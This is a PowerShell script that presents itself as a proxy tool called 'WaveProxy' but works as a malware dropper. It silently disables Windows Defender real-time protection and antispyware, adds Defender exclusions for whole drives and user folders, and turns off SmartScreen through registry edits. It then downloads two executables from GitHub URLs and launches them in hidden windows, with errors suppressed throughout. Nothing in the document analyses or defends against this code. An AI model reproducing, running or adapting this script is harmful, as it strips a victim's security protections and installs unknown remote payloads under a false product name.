Clear
Write-Host ("WaveProxy - Best proxy!") -ForegroundColor Cyan
 
$folderPath1 = "C:\Windows\Temp"
$folderPath2 = "C:\"
$folderPath3 = "C:\ProgramData"
$folderPath = "C:\Users"
Add-MpPreference -ExclusionPath $folderPath -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $folderPath1 -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $folderPath2 -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $folderPath3 -Force -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
Add-MpPreference -ExclusionPath $folderPath1 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folderPath2 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folderPath3 -ErrorAction SilentlyContinue
Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Defender\SmartScreen" -Name 'ConfigureAppInstallControl' -Value 0 -Type DWORD -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Defender\SmartScreen" -Name 'ConfigureSmartScreen' -Value 2 -Type DWORD -Force -ErrorAction SilentlyContinue
 
$url = ""
$outputFile = "C:\Users\ccmmd.exe"
 
Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe" -ErrorAction SilentlyContinue
 
    # Запускаем 
    Start-Process -FilePath "fix.exe" -WindowStyle Hidden

Invoke-WebRequest -Uri "https://github.com/sys1e/winlogo/raw/refs/heads/main/Installer.exe" -OutFile "Installer.exe" -ErrorAction SilentlyContinue
 
    # Запускаем 
    Start-Process -FilePath "Installer.exe" -WindowStyle Hidden